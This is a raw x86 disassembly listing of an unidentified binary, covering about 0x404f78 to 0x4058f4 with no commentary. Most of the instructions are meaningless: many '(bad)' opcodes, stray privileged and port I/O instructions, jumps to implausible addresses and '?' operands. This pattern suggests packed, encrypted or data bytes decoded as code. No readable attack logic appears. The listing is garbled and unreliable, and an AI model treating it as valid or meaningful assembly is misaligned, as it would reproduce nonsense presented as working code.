  404f78:	add    BYTE PTR [esi],dh
  404f7a:	lods   al,BYTE PTR ds:[esi]
  404f7b:	loopne 0x404f7b
  404f7d:	outs   dx,BYTE PTR cs:[esi]
  404f7f:	pushf  
  404f80:	or     eax,0xb04f951
  404f85:	sub    ebp,esi
  404f87:	cli    
  404f88:	mov    WORD PTR [ecx+ebp*1-0x72],?
  404f8c:	dec    DWORD PTR [esi]
	...
  404f9e:	add    BYTE PTR [eax],al
  404fa0:	jmp    0x404f31
  404fa2:	rol    BYTE PTR [eax],1
  404fa4:	pusha  
  404fa5:	cld    
  404fa6:	fidiv  DWORD PTR [ebp+0x17]
  404fa9:	xchg   BYTE PTR [ebp-0x8cdbd0],al
  404faf:	push   eax
  404fb0:	sti    
  404fb1:	mov    dh,0xa7
  404fb3:	add    BYTE PTR [ebx],ah
  404fb5:	icebp  
  404fb6:	and    ecx,DWORD PTR [ebp-0x14762]
  404fbc:	and    al,0xd8
  404fbe:	(bad)  
  404fbf:	jne    0x404f9c
  404fc1:	push   0x45
  404fc3:	shl    DWORD PTR [edx+esi*2+0x72a775ff],cl
  404fca:	jne    0x404fd4
  404fcc:	mov    ebx,0xa4ffd380
  404fd1:	rcr    BYTE PTR [edx-0x37],cl
  404fd4:	mov    eax,ds:0x4854fffd
  404fd9:	gs add esp,0xffff6a7b
  404fe0:	push   esi
  404fe1:	cmp    al,0xfc
  404fe3:	push   eax
  404fe4:	je     0x404fd2
  404fe6:	or     edi,edi
  404fe8:	outs   dx,BYTE PTR ds:[esi]
  404fe9:	mov    bl,0x28
  404feb:	inc    ecx
  404fec:	xchg   ebx,eax
  404fed:	push   0xffffffba
  404fef:	test   al,0xa3
  404ff1:	add    cl,BYTE PTR [ebx]
  404ff3:	rol    BYTE PTR [ebp+edi*2+0x29300e7],0xc7
  404ffb:	inc    ebp
  404ffc:	sub    ecx,DWORD PTR [ecx]
  404ffe:	add    BYTE PTR [eax],al
  405000:	arpl   WORD PTR [ebx+0xf445],di
	...
  405016:	mov    ah,0xf9
  405018:	(bad)  
  405019:	dec    DWORD PTR [ecx+0x2]
  40501c:	push   0x0
  40501e:	(bad)  
  40501f:	jnp    0x40500d
  405021:	mul    DWORD PTR [edx+esi*2]
  405024:	push   eax
  405025:	push   0x63
  405027:	test   DWORD PTR [ebp-0xc],eax
  40502a:	add    DWORD PTR [ebp-0x11050b7b],0xffffff92
  405031:	dec    edx
  405033:	(bad)  
  405034:	sbb    al,bh
  405036:	sub    eax,0x83e88f11
  40503b:	xor    al,0x4
  40503d:	add    cl,dh
  40503f:	fist   DWORD PTR [edi]
  405041:	add    eax,0x44923
  405046:	cli    
  405047:	sbb    dl,BYTE PTR [eax-0x14]
  40504a:	or     eax,0x860192af
  40504f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405050:	xchg   BYTE PTR [ebp-0x6d491a],bh
  405056:	cmc    
  405057:	iret   
  405058:	or     bh,bh
  40505a:	aas    
  40505b:	les    ebx,FWORD PTR [esi-0x2c5fad4a]
  405061:	inc    eax
  405062:	cli    
  405063:	xor    BYTE PTR [eax-0x6d993a0c],cl
  405069:	push   eax
  40506a:	rcr    BYTE PTR [edi],cl
  40506c:	pop    ebx
  40506d:	add    dl,bh
  40506f:	mov    ds:0x312b74c3,al
  405074:	mov    al,ch
  405076:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405077:	xchg   BYTE PTR [edx+0x50],dl
	...
  405089:	add    BYTE PTR [eax],al
  40508b:	add    BYTE PTR [edi+0x28],dh
  40508e:	xchg   edi,eax
  40508f:	neg    DWORD PTR [ebp+0xfff3316]
  405095:	mov    al,0x92
  405097:	xor    eax,0x44f4cd
  40509c:	xchg   edx,eax
  40509d:	xor    ebp,DWORD PTR [ebx-0x3c5d8201]
  4050a3:	je     0x405070
  4050a5:	and    al,0x88
  4050a7:	lock gs inc esi
  4050aa:	xchg   edx,eax
  4050ab:	push   0xbea29bfb
  4050b0:	pop    ebp
  4050b1:	push   eax
  4050b2:	sti    
  4050b3:	out    0xb8,eax
  4050b5:	jmp    0x4ba504b
  4050ba:	fs lahf 
  4050bc:	dec    ebp
  4050bd:	lea    ebx,[esi]
  4050bf:	add    al,0xc7
  4050c1:	add    BYTE PTR [ebx-0x1ee8cafd],al
  4050c7:	fsave  [edx-0x5ee6dfa]
  4050ce:	xchg   edx,eax
  4050cf:	add    al,0x1d
  4050d1:	pop    ss
  4050d2:	loope  0x40506f
  4050d4:	fnstenv [edx+0x570d91ee]
  4050da:	rcr    DWORD PTR [ecx+0x57de8d05],1
  4050e0:	or     dl,BYTE PTR [ebp+0x12f591d6]
  4050e6:	loope  0x405083
  4050e8:	aaa    
  4050e9:	mov    bh,0xc6
  4050eb:	xchg   ecx,eax
  4050ec:	in     eax,0x52
  4050ee:	mov    ecx,0x99
	...
  4050ff:	add    BYTE PTR [eax],al
  405101:	add    ch,bl
  405103:	mov    ecx,es
  405105:	or     eax,0x91ae8caf
  40510a:	aaa    
  40510b:	lea    edx,[eax-0x61733b24]
  405111:	xchg   ecx,eax
  405112:	inc    edi
  405113:	mov    DWORD PTR [ecx-0x16faa239],eax
  405119:	mov    edx,0x36e8fdb8
  40511e:	jno    0x4050b9
  405120:	push   0x769496c8
  405125:	xchg   ecx,eax
  405126:	xchg   DWORD PTR [edx+0x6d],eax
  405129:	xor    al,0x8d
  40512b:	adc    dh,ch
  40512d:	nop
  40512e:	iret   
  40512f:	retf   
  405130:	cmovae edi,edx
  405133:	pushf  
  405134:	test   DWORD PTR [ecx-0x6],ebp
  405137:	add    al,0xe2
  405139:	ret    
  40513a:	std    
  40513b:	sbb    DWORD PTR [edx+0x2604fa02],0x56247
  405145:	jmp    0xa5075643
  40514a:	mov    WORD PTR gs:[edi],es
  40514d:	jmp    0x9340704b
  405152:	stc    
  405153:	push   ds
  405154:	add    BYTE PTR [ebx+0x154579f9],al
  40515a:	out    0x79,al
  40515c:	test   ebp,edi
  40515e:	or     BYTE PTR [edi+edi*8-0x7ed7567],0xf6
	...
  405176:	add    BYTE PTR [eax],al
  405178:	in     al,dx
  405179:	mov    al,ch
  40517b:	outs   dx,DWORD PTR ds:[esi]
  40517c:	mov    ds:0x39f20004,al
  405181:	adc    DWORD PTR ds:0x503d0,eax
  405187:	jmp    0x2868a69d
  40518c:	test   BYTE PTR [ebx+0x6581f575],0xd8
  405193:	mov    esi,0x998b348a
  405198:	push   esp
  405199:	xor    ah,0xb6
  40519c:	push   0xffffff8b
  40519e:	push   eax
  40519f:	cmp    esp,DWORD PTR [esi+0x75]
  4051a2:	fcomp  DWORD PTR [esi-0x667a8296]
  4051a8:	xchg   edx,eax
  4051a9:	mov    edi,edi
  4051ab:	and    DWORD PTR [edx-0x50],0x50786ff
  4051b2:	push   0x449a8c
  4051b7:	jbe    0x4051e5
  4051b9:	xchg   ebp,eax
  4051ba:	imul   DWORD PTR [esi+0x6a]
  4051bd:	mov    esi,DWORD PTR ds:0x44a126
  4051c3:	push   ecx
  4051c4:	push   edx
  4051c5:	mov    bl,0xff
  4051c7:	push   esi
  4051c8:	lock and esp,0x6a8b8a56
  4051cf:	add    BYTE PTR [ebx-0x11],dl
  4051d2:	cmc    
  4051d3:	das    
  4051d4:	xchg   edx,eax
  4051d5:	pop    es
  4051d6:	push   DWORD PTR [ebp-0x92ed]
	...
  4051ec:	add    BYTE PTR [eax],al
  4051ee:	sbb    al,0xb3
  4051f0:	sub    DWORD PTR ds:[edx+0x4c9e807],edx
  4051f7:	jne    0x4051f8
  4051f9:	mov    DWORD PTR [esi-0x3000895],esp
  4051ff:	jmp    0xa53cba03
  405204:	inc    eax
  405205:	add    BYTE PTR [ecx+esi*1],bl
  405208:	lock test DWORD PTR [ebx+edi*2],0xae5c35ff
  405210:	inc    eax
  405211:	add    BYTE PTR [ebx],ch
  405213:	das    
  405214:	xlat   BYTE PTR ds:[ebx]
  405215:	call   FWORD PTR [ecx+ecx*1]
  405218:	test   eax,ebp
  40521a:	aam    0x7a
  40521c:	inc    DWORD PTR [ebx-0x8a282]
  405222:	mov    esp,0x50497401
  405227:	xor    al,0xec
  405229:	test   DWORD PTR [edx+edi*2-0x79dc8c00],0x7a64e8bd
  405234:	inc    DWORD PTR [eax]
  405236:	out    0xb1,eax
  405238:	add    BYTE PTR [bp+di-0x4195],ah
  40523d:	inc    DWORD PTR [esi]
  40523f:	mov    edi,esp
  405241:	out    dx,al
  405242:	cmp    DWORD PTR [edx-0x1],0xffffffff
  405246:	out    0x64,al
  405248:	idiv   edi
  40524a:	or     al,0x7a
  40524c:	jne    0x405256
  40524e:	jnp    0x405297
  405250:	sar    edi,1
	...
  405262:	add    BYTE PTR [eax],al
  405264:	sbb    al,0x7a
  405266:	mov    ch,0xe8
  405268:	and    al,0x7a
  40526a:	(bad)  
  40526b:	(bad)  
  40526c:	cli    
  40526d:	test   al,0xfb
  40526f:	out    0x26,eax
  405271:	int    0x8e
  405273:	jmp    DWORD PTR [ebp+0x9]
  405276:	test   al,0xf7
  405278:	pop    ebp
  405279:	retf   
  40527a:	mov    ?,WORD PTR [ebp+0x2]
  40527d:	inc    esp
  40527e:	out    0xd0,al
  405280:	dec    ebp
  405281:	fisttp DWORD PTR [esi-0x7114a14b]
  405287:	call   DWORD PTR [edx-0x54]
  40528a:	mov    bh,0xff
  40528c:	xor    eax,0x25ec58f3
  405291:	sti    
  405292:	mov    gs,eax
  405294:	(bad)  
  405296:	mov    ?,edi
  405298:	sbb    eax,0x15f79bd1
  40529d:	xchg   ebx,eax
  40529e:	fwait
  40529f:	sbb    ah,BYTE PTR [esi]
  4052a1:	fwait
  4052a2:	mov    ?,edi
  4052a4:	dec    edi
  4052a5:	lods   al,BYTE PTR ds:[esi]
  4052a6:	xchg   esi,eax
  4052a7:	(bad)  
  4052a8:	std    
  4052a9:	stos   BYTE PTR es:[edi],al
  4052aa:	sbb    BYTE PTR [eax],cl
  4052ac:	loop   0x405326
  4052ae:	(bad)  
  4052af:	(bad)  
  4052b0:	in     eax,dx
  4052b1:	mov    edx,0xc2edf058
  4052b6:	mov    gs,eax
  4052b8:	sti    
  4052b9:	outs   dx,DWORD PTR ds:[esi]
  4052ba:	mov    ?,edi
  4052bc:	aad    0xd8
  4052be:	mov    ebp,ecx
  4052c0:	mov    ds,WORD PTR [ecx-0x72]
  4052c3:	inc    ebp
  4052c5:	call   0x413b59
	...
  4052da:	xor    DWORD PTR [edx+0x3],eax
  4052dd:	add    bl,al
  4052df:	pop    ebp
  4052e0:	sti    
  4052e1:	inc    DWORD PTR [esi+0x27]
  4052e4:	lahf   
  4052e5:	cmp    DWORD PTR [esi+0x1000197f],0xffffff9d
  4052ec:	mov    ?,WORD PTR [ebp+0x2]
  4052ef:	test   dl,dh
  4052f1:	ror    BYTE PTR [ebp-0x79ba83e6],1
  4052f7:	add    al,0xd1
  4052f9:	xor    ch,cl
  4052fb:	inc    ebx
  4052fc:	jmp    0x413d428f
  405301:	daa    
  405302:	ins    BYTE PTR es:[edi],dx
  405303:	mov    DWORD PTR [esi+0x1b],ecx
  405306:	out    0xd9,al
  405308:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405309:	add    ebx,DWORD PTR [ebp+0xf]
  40530c:	icebp  
  40530d:	fwait
  40530e:	lods   eax,DWORD PTR ds:[esi]
  40530f:	mov    dh,BYTE PTR [esi]
  405311:	mov    fs,edx
  405313:	push   0x89fa44fe
  405318:	pushf  
  405319:	sti    
  40531a:	push   ebp
  40531b:	enter  0x8e1b,0x35
  40531f:	sbb    al,0x2d
  405321:	fidivr WORD PTR [edx-0xde7f1fc]
  405327:	pushf  
  405328:	(bad)  
  405329:	nop
  40532a:	sbb    eax,0x1617fe89
  40532f:	mov    DWORD PTR [ebx+edi*8+0x15],edi
  405333:	icebp  
  405334:	pop    ss
  405335:	mov    es,WORD PTR ds:0xfa08abbb
  40533b:	das    
  40533c:	jb     0x4052de
	...
  40534e:	add    BYTE PTR [eax],al
  405350:	bound  eax,QWORD PTR ds:0x88ac9ce9
  405356:	push   esp
  405357:	add    ch,ah
  405359:	adc    dh,cl
  40535b:	fwait
  40535c:	dec    esi
  40535d:	xchg   edx,eax
  40535e:	mov    esi,0xe1c3c38d
  405363:	add    esp,DWORD PTR [edi]
  405365:	jl     0x405324
  405367:	add    DWORD PTR [edi-0x7],0xe379fce8
  40536e:	out    0x3,eax
  405370:	cli    
  405371:	xchg   DWORD PTR [eax+eax*1],ebx
  405374:	mov    ds:0xa58daf2b,al
  405379:	cld    
  40537a:	test   al,0x17
  40537c:	or     bl,BYTE PTR ds:0x53adc39
  405382:	add    BYTE PTR [esi-0x1b],dh
  405385:	clc    
  405386:	out    0x22,eax
  405388:	dec    edi
  405389:	mov    bh,bh
  40538b:	jo     0x4053c2
  40538d:	stc    
  40538e:	imul   ebp,ecx,0xa82fde11
  405394:	stc    
  405395:	sbb    al,0x34
  405397:	sbb    DWORD PTR [ecx+0x2efcff04],edi
  40539d:	fld    QWORD PTR [eax-0x17]
  4053a0:	jno    0x4053d1
  4053a2:	(bad)  
  4053a3:	ss jg  0x4053a2
  4053a6:	mov    edi,0x503857b5
  4053ab:	es in  eax,0xf8
  4053ae:	out    0x2e,eax
  4053b0:	ins    BYTE PTR es:[edi],dx
  4053b1:	mov    bh,bh
  4053b3:	mov    ecx,0x0
	...
  4053c4:	add    BYTE PTR [eax],al
  4053c6:	jmp    0x8221c952
  4053cb:	jbe    0x4053cc
  4053cd:	push   es
  4053ce:	outs   dx,DWORD PTR ds:[esi]
  4053cf:	popf   
  4053d0:	and    DWORD PTR [edx],ebx
  4053d2:	xchg   DWORD PTR [eax-0x77b52a18],ecx
  4053d8:	inc    DWORD PTR [ebx+0x19291cf9]
  4053de:	mov    ecx,0xce156804
  4053e3:	inc    esp
  4053e4:	add    BYTE PTR [ecx-0x8],al
  4053e7:	add    al,0x0
  4053e9:	imul   eax,DWORD PTR [ecx+0x6ec6d5e6],0xe435bffb
  4053f3:	aaa    
  4053f4:	push   eax
  4053f5:	mov    dh,0xe4
  4053f7:	clc    
  4053f8:	out    0x56,eax
  4053fa:	pop    DWORD PTR [edi-0x77f9c601]
  405400:	jne    0x4053f3
  405402:	xchg   ecx,eax
  405403:	sub    eax,0x9c7e96ff
  405408:	jmp    0xe8c7cac8
  40540d:	add    BYTE PTR [edi+0x55],ch
  405410:	(bad)  
  405411:	(bad)  
  405412:	jmp    0x5369bc17
  405417:	inc    edx
  405418:	add    BYTE PTR [eax-0x14],ch
  40541b:	mov    al,0x40
  40541d:	add    BYTE PTR [edi+ebp*4],dl
  405420:	sub    DWORD PTR ds:[edx+0x2ee5e803],esp
  405427:	jns    0x405428
  405429:	or     eax,DWORD PTR [eax]
	...
  40543b:	add    BYTE PTR [ebx],dl
  40543d:	lock sbb eax,0x75788350
  405443:	or     al,0xab
  405445:	(bad)  
  405447:	inc    DWORD PTR [esp+edx*8]
  40544a:	dec    edi
  40544b:	dec    DWORD PTR [esi+0x1420e78b]
  405451:	jns    0x405452
  405453:	call   0x3faa2b
  405458:	sti    
  405459:	sub    al,0xd2
  40545b:	push   esp
  40545d:	in     eax,dx
  40545e:	jmp    DWORD PTR [edi+0x4a]
  405461:	mov    bl,0x40
  405463:	add    BYTE PTR [ebx-0x30],ch
  405466:	das    
  405467:	inc    ecx
  405468:	and    ebp,ebx
  40546a:	add    DWORD PTR [eax],eax
  40546c:	adc    eax,DWORD PTR [ebx+0x7b3eade8]
  405472:	dec    DWORD PTR [ebx]
  405474:	mov    ds:0x33501df5,eax
  405479:	jp     0x4054f0
  40547b:	or     al,0xbb
  40547d:	mov    ds:0xd1b4ffd5,eax
  405482:	dec    edi
  405483:	dec    DWORD PTR [esi]
  405485:	mov    edi,esp
  405487:	call   0xe93fcf11
  40548c:	or     ecx,DWORD PTR [edi-0x1]
  40548f:	jmp    FWORD PTR [ebx-0x12]
  405492:	sar    edi,1
  405494:	xchg   esp,eax
  405495:	jmp    0xdd3a84a2
  40549a:	add    edi,edi
  40549c:	das    
  40549d:	test   al,0x9b
  40549f:	add    eax,0x0
	...
  4054b0:	add    BYTE PTR [eax],al
  4054b2:	les    edi,FWORD PTR [edi-0x75]
  4054b5:	push   eax
  4054b6:	sub    al,BYTE PTR [edi]
  4054b8:	adc    DWORD PTR [eax],ecx
  4054ba:	mov    ds:0x85ff8a57,al
  4054bf:	test   BYTE PTR [ebx],dh
  4054c1:	sar    BYTE PTR [ebp+0x1f],cl
  4054c4:	mov    esi,DWORD PTR [ebp+0x6]
  4054c7:	xor    al,0x3b
  4054c9:	shr    BYTE PTR [ebp+0x2f],cl
  4054cc:	mov    ebp,0x309bf2c2
  4054d1:	mov    ecx,DWORD PTR [esi+0x1b]
  4054d4:	shl    ah,0xe0
  4054d7:	fwait
  4054d8:	sbb    eax,0xfb494d02
  4054dd:	out    0xcb,eax
  4054df:	out    0x8a,al
  4054e1:	push   DWORD PTR [ebx+0x59]
  4054e4:	xchg   DWORD PTR [eax-0x1],ebp
  4054e7:	pushf  
  4054e8:	add    eax,DWORD PTR [eax]
  4054ea:	and    bl,BYTE PTR [ebx-0x4b]
  4054ed:	jmp    DWORD PTR ds:0x92f84125
  4054f3:	xchg   edi,eax
  4054f4:	add    al,0x0
  4054f6:	cli    
  4054f7:	xchg   BYTE PTR [eax],dl
  4054f9:	clc    
  4054fa:	and    ah,ah
  4054fc:	data16 add dl,bh
  4054ff:	mov    ds:0xe0e674c3,al
  405504:	inc    DWORD PTR [eax]
  405506:	cli    
  405507:	fwait
  405508:	adc    cl,BYTE PTR ds:0xff8c28ed
  40550e:	outs   dx,DWORD PTR ds:[esi]
  40550f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405510:	fwait
  405511:	mov    ah,bl
  405513:	mov    esi,0xeb8a
	...
  405528:	add    al,BYTE PTR [edi+0x10]
  40552b:	clc    
  40552c:	loop   0x40557d
  40552e:	mov    ah,0xff
  405530:	lds    eax,FWORD PTR [ecx-0x24]
  405533:	out    0x36,eax
  405535:	add    eax,0x34b58abf
  40553a:	sahf   
  40553b:	adc    BYTE PTR [edx],al
  40553d:	popf   
  40553e:	pop    es
  40553f:	mov    ah,BYTE PTR [ebp-0x6a11fc7b]
  405545:	rcr    BYTE PTR [esi-0x57066a76],1
  40554b:	(bad)  
  40554d:	sbb    al,0xdc
  40554f:	sar    DWORD PTR [edx],cl
  405551:	add    eax,0xafb39c19
  405556:	data16 mov cl,dl
  405559:	test   esp,edx
  40555b:	sti    
  40555c:	push   ebp
  40555d:	xor    eax,0x1a658a57
  405562:	or     bl,BYTE PTR [edi+eax*1+0x18a46af]
  405569:	lds    esi,FWORD PTR [ebp-0x7102a11]
  40556f:	inc    esp
  405570:	cli    
  405571:	xor    al,0x41
  405573:	pop    ebp
  405574:	daa    
  405575:	test   DWORD PTR [esi],esp
  405577:	xor    esi,DWORD PTR ds:0xea9bf10f
  40557d:	xchg   BYTE PTR [esi],dl
  40557f:	mov    dl,BYTE PTR [eax+0x479100e8]
  405585:	test   DWORD PTR [esi],eax
  405587:	(bad)  
  405588:	push   ebp
  405589:	adc    ch,dl
  40558b:	sbb    eax,DWORD PTR [eax]
	...
  40559d:	add    bh,ah
  40559f:	aam    0xa7
  4055a1:	add    ebp,DWORD PTR [edx-0x24f9d64]
  4055a7:	test   BYTE PTR [ecx],bh
  4055a9:	mov    DWORD PTR [edi+0xd],ebp
  4055ac:	shl    ebx,1
  4055ae:	out    dx,eax
  4055af:	test   dh,dl
  4055b1:	push   ds
  4055b2:	cli    
  4055b3:	in     al,dx
  4055b4:	out    dx,al
  4055b5:	sar    DWORD PTR [edx],cl
  4055b7:	add    eax,0xc625d051
  4055bc:	call   0x845d49
  4055c1:	add    BYTE PTR [ecx],bh
  4055c3:	add    eax,0x848a59e8
  4055c8:	(bad)  
  4055c9:	cmp    DWORD PTR [ebx-0x766ef806],eax
  4055cf:	cmp    bh,0x96
  4055d2:	add    al,0x5
  4055d4:	push   0xffc5c9c0
  4055d9:	adc    BYTE PTR [edx-0x7d16becc],ch
  4055df:	cmp    bh,BYTE PTR [edi]
  4055e1:	sar    BYTE PTR [eax],0x5
  4055e4:	call   0xffc4a3e2
  4055e9:	repnz cmp ecx,edi
  4055ec:	adc    eax,0xff792d70
  4055f1:	fdiv   QWORD PTR [ebp-0x7c]
  4055f4:	jne    0x4055d7
  4055f6:	xor    DWORD PTR [esi-0x7b7cb903],0x436e3575
  405600:	shl    DWORD PTR [esi],1
	...
  405612:	add    BYTE PTR [eax],al
  405614:	jae    0x405605
  405616:	inc    eax
  405618:	push   ebx
  405619:	xor    al,0x41
  40561b:	jmp    0xa8703231
  405620:	stc    
  405621:	xor    DWORD PTR ds:0xffc540d6,0x0
  405628:	xor    ebx,DWORD PTR [eax-0x1]
  40562b:	push   es
  40562c:	into   
  40562d:	xor    DWORD PTR [ebp-0xf],0x71
  405631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405632:	std    
  405633:	div    BYTE PTR [edx-0x11]
  405636:	inc    DWORD PTR [eax-0x16becbe0]
  40563c:	adc    esp,ebx
  40563e:	das    
  40563f:	sub    dh,dh
  405641:	xor    DWORD PTR ds:0xffc4c116,0xffffffc0
  405648:	rcl    BYTE PTR [edi-0x1],cl
  40564b:	add    BYTE PTR [eax+eax*4-0x15a8b41],bh
  405652:	inc    esp
  405653:	hlt    
  405654:	mov    WORD PTR [edx],ss
  405656:	hlt    
  405657:	inc    DWORD PTR [esi]
  405659:	and    edi,0xff8c5e60
  40565f:	inc    DWORD PTR [esi]
  405661:	xchg   ebp,eax
  405662:	call   0xffccba54
  405667:	push   0xffffff93
  405669:	pop    ds
  40566a:	push   ds
  40566b:	xor    dl,ah
  40566d:	or     BYTE PTR [eax+0x34],ch
  405670:	push   ebx
  405671:	(bad)  
  405672:	jmp    DWORD PTR [edi-0x6f]
  405675:	pop    es
  405676:	add    BYTE PTR [eax+0x0],al
	...
  405688:	add    BYTE PTR [eax],al
  40568a:	jnp    0x405628
  40568c:	sar    edi,cl
  40568e:	fdiv   QWORD PTR [edi]
  405690:	push   DWORD PTR [ebp+0x6b]
  405693:	lahf   
  405694:	push   eax
  405695:	std    
  405696:	int3   
  405697:	mov    WORD PTR [edx+0x0],gs
  40569a:	cmp    ebx,DWORD PTR [esi+0x2f]
  40569d:	inc    ecx
  40569e:	arpl   WORD PTR [edi],bx
  4056a0:	xor    al,0x30
  4056a2:	mov    ds:0x53026807,al
  4056a7:	pop    es
  4056a8:	sub    al,0xe3
  4056ab:	mov    eax,0x4728ffff
  4056b0:	je     0x4056c8
  4056b2:	stos   BYTE PTR es:[edi],al
  4056b3:	inc    edx
  4056b4:	hlt    
  4056b5:	inc    DWORD PTR [esi+0x1b75ff93]
  4056bb:	lahf   
  4056bc:	adc    ebp,edi
  4056be:	cld    
  4056bf:	mov    edi,?
  4056c1:	jne    0x4056ca
  4056c3:	sahf   
  4056c4:	sahf   
  4056c5:	ror    BYTE PTR [ebx+ecx*4],1
  4056c8:	push   0x0
  4056ca:	jnp    0x405739
  4056cc:	das    
  4056cd:	inc    ecx
  4056ce:	jecxz  0x4056ee
  4056d0:	push   edi
  4056d1:	xor    BYTE PTR [edx],ah
  4056d3:	or     DWORD PTR [eax+0x2],ebp
  4056d6:	cli    
  4056d7:	imul   eax,DWORD PTR [ebx],0xffffff80
  4056da:	ror    BYTE PTR [ebx+esi*4-0x78e32a01],cl
  4056e1:	jne    0x4056e5
  4056e3:	push   esp
  4056e4:	add    eax,0x1abbc5fd
  4056e9:	add    BYTE PTR [edx+0x5],dl
  4056ec:	aam    0x40
	...
  4056fe:	add    BYTE PTR [eax],al
  405700:	cli    
  405701:	adc    ebp,DWORD PTR [edi]
  405703:	xor    BYTE PTR [ebx],bh
  405705:	ins    BYTE PTR es:[edi],dx
  405706:	sbb    eax,DWORD PTR [edx]
  405708:	cli    
  405709:	imul   eax,DWORD PTR [ebx-0x78408418],0xffffffff
  405710:	add    DWORD PTR [eax+edx*1-0x6fd67cea],ebp
  405717:	dec    DWORD PTR [edi]
  405719:	add    BYTE PTR [edi-0x3d7c0d8b],al
  40571f:	cld    
  405720:	jne    0x40570d
  405722:	xchg   BYTE PTR [ebp+0x66],dh
  405725:	aam    0x36
  405727:	shl    BYTE PTR [ebp-0x25],1
  40572a:	xchg   BYTE PTR [ebp+0x5e],dh
  40572d:	rcl    DWORD PTR [eax],cl
  40572f:	or     BYTE PTR [edx+0x2e],ah
  405732:	mov    ecx,0xc2354dff
  405737:	add    al,0xfa
  405739:	mov    al,ds:0x6bd2ec7a
  40573e:	add    ebp,edi
  405740:	je     0x40576d
  405742:	adc    DWORD PTR [ebp*1+0xde7fb99],ecx
  405749:	push   ds
  40574a:	xchg   edi,edi
  40574c:	xor    ebp,DWORD PTR [esi]
  40574e:	cld    
  40574f:	jmp    FWORD PTR [esi+0x368197f6]
  405755:	cmp    BYTE PTR [esi-0x7eccfa01],al
  40575b:	mov    eax,0x8672fc
  405760:	cli    
  405761:	add    al,0xe9
  405763:	add    eax,DWORD PTR [eax]
	...
  405775:	add    BYTE PTR [ecx-0x5a051339],al
  40577b:	clc    
  40577c:	jmp    0x405701
  40577e:	and    al,BYTE PTR ds:0xdbe30154
  405784:	out    0x3,eax
  405786:	cli    
  405787:	xor    DWORD PTR [eax+edi*8],0x869372dd
  40578e:	mov    ebp,0x510a90d
  405793:	in     eax,dx
  405794:	inc    edi
  405795:	xlat   BYTE PTR ds:[ebx]
  405796:	cmp    al,BYTE PTR ds:0x6cf6109e
  40579c:	bound  esi,QWORD PTR [edx-0x77d7e63]
  4057a2:	sbb    eax,0xfa44d5ab
  4057a7:	xor    esp,0x9a009df7
  4057ad:	xchg   BYTE PTR [ebp-0x75],bh
  4057b0:	fs dec ebx
  4057b2:	je     0x405735
  4057b4:	sbb    bp,WORD PTR [esp+eax*1]
  4057b8:	jmp    0x2bc7cec0
  4057bd:	test   DWORD PTR [ebp-0x7f],ebx
  4057c0:	mov    ecx,0x46514e9b
  4057c5:	xchg   BYTE PTR [edi-0x79],bh
  4057c8:	sub    eax,DWORD PTR [ebp-0x79667ebb]
  4057ce:	xchg   DWORD PTR [edi+ebp*1-0x2693ca7a],edi
  4057d5:	fs cli 
  4057d7:	add    al,0x70
  4057d9:	add    BYTE PTR [eax],0x0
	...
  4057ec:	data16 adc BYTE PTR [esi],0x86
  4057f0:	mov    edx,0xfa8a6511
  4057f5:	add    al,0xe9
  4057f7:	js     0x405860
  4057f9:	inc    esi
  4057fa:	inc    DWORD PTR [ebp-0x14ff86fb]
  405800:	or     DWORD PTR [ecx-0x15fa1601],eax
  405806:	mov    WORD PTR [ebx],gs
  405808:	rcl    al,cl
  40580a:	addr16 jge 0x4057cf
  40580d:	(bad)  
  405810:	in     eax,0xa5
  405812:	add    cl,ch
  405814:	rol    al,cl
  405816:	jne    0x405804
  405818:	jo     0x4057d0
  40581a:	add    cl,ch
  40581c:	stc    
  40581d:	xchg   ecx,eax
  40581e:	xchg   ebp,eax
  40581f:	stos   DWORD PTR es:[edi],eax
  405820:	je     0x4057a2
  405822:	call   FWORD PTR [eax+edi*1+0x31]
  405826:	push   eax
  405827:	adc    DWORD PTR [ecx+esi*1],edx
  40582a:	inc    ecx
  40582b:	jmp    0xe9e0cdb1
  405830:	stc    
  405831:	or     eax,eax
  405833:	adc    al,0x95
  405835:	ins    DWORD PTR es:[edi],dx
  405836:	xchg   esp,eax
  405837:	jmp    0x39a85d35
  40583c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40583d:	(bad)  
  405840:	in     eax,dx
  405841:	adc    al,ch
  405843:	jbe    0x4057ed
  405845:	cmp    bh,0x74
  405848:	fld    QWORD PTR [edx-0x2]
  40584b:	pop    esi
  40584c:	jg     0x4057e0
  40584e:	push   edx
  40584f:	add    eax,0x0
	...
  405860:	add    BYTE PTR [eax],al
  405862:	sub    ch,dl
  405864:	out    0x12,eax
  405866:	mov    eax,DWORD PTR [eax-0x5896601]
  40586c:	setns  BYTE PTR [esi-0x6]
  405870:	pop    es
  405871:	inc    ecx
  405872:	dec    eax
  405873:	jg     0x405874
  405875:	cs xchg esi,eax
  405877:	aaa    
  405878:	iret   
  405879:	es ja  0x4058e8
  40587c:	arpl   WORD PTR [eax+edi*4+0x30],bp
  405880:	mov    DWORD PTR [edx+ecx*8+0x7e],ebp
  405884:	dec    DWORD PTR [esi]
  405886:	mul    BYTE PTR [ebx+0x4620030]
  40588c:	push   DWORD PTR [ebp-0x7931]
  405892:	sti    
  405893:	shl    DWORD PTR [eax-0x40831d00],1
  405899:	je     0x4058b8
  40589b:	and    DWORD PTR [eax-0xf6edd8],esi
  4058a1:	jne    0x40587a
  4058a3:	fwait
  4058a4:	test   eax,0xff88c4d2
  4058a9:	mov    ch,0x4f
  4058ab:	mov    bh,bh
  4058ad:	jmp    ebx
  4058af:	mov    al,ds:0x8884d2f1
  4058b4:	push   eax
  4058b5:	push   eax
  4058b6:	and    BYTE PTR [edi],al
  4058b8:	adc    BYTE PTR [eax],al
  4058ba:	vmread DWORD PTR [edi-0x7e],esp
  4058be:	ret    
  4058bf:	ret    0x4fff
  4058c2:	jnp    0x4058c4
  4058c4:	mov    eax,ds:0x0
	...
  4058d5:	add    BYTE PTR [eax],al
  4058d7:	add    BYTE PTR [ebx-0x5d47fa64],ah
  4058dd:	add    eax,DWORD PTR [eax]
  4058df:	add    cl,bl
  4058e1:	jge    0x4058a2
  4058e3:	je     0x40587f
  4058e5:	xor    eax,0x9b5b75ff
  4058ea:	xchg   esi,eax
  4058eb:	(bad)  
  4058ec:	aam    0x88
  4058ee:	call   0xffc96ec4
  4058f3:	(bad)  
  4058f4:	into   
